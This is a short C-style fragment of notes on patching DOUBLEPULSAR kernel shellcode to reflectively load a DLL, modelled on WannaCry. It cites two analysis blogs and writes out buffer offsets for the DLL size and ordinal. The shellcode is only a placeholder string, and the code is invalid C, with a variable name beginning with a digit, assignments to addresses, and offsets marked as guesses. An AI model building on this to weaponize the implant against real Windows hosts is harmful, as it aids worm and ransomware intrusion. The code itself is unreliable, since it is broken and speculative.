/*
Sources: 
https://oxis.github.io/Custom-DOUBLEPULSAR-useland-shellcode/
https://blog.f-secure.com/doublepulsar-usermode-analysis-generic-reflective-dll-loader/
*/


unsigned char 64_bit_kernel_shellcode[] = "64 bit kernel shellcode here that is referenced";

/*
These values are referenced relative to the address obtained by the self-locating pop-call instructions at the start, 
which placed the address of offset 0x25 in the shellcode buffer into rbp. 
Thus we see the size for the DLL memory allocation coming from [rbp+0xF5D] 
which is 0x25+0xF5D, or 0xF82 offset into the shellcode buffer.*/

//Update Shellcode to include this number, possibly the DLL size??
//0x591 = 1425
&64_bit_kernel_shellcode[1425] = 0x7D70; //32112 ( this value was found in wannacry )

//According to :
//0xF82 should be patched in the Shellcode buffer to include the size of the DLL
//https://blog.f-secure.com/doublepulsar-usermode-analysis-generic-reflective-dll-loader/
&64_bit_kernel_shellcode[0xf82] = SizeOfDLLHere;
//Same thing as above but decimal instead of hex
&64_bit_kernel_shellcode[3970] = SizeOfDLLHere;

//Update Shellcode to include the DLL ordinal
&64_bit_kernel_shellcode[0xf86] = 1;
//Same thing as above but decimal instead of hex
&64_bit_kernel_shellcode[3974] = 1;
//Value is possibly: 1429 or 0x595

//not sure why Wannacry does this:
&64_bit_kernel_shellcode[2158] = (0x50D800 + 3978);


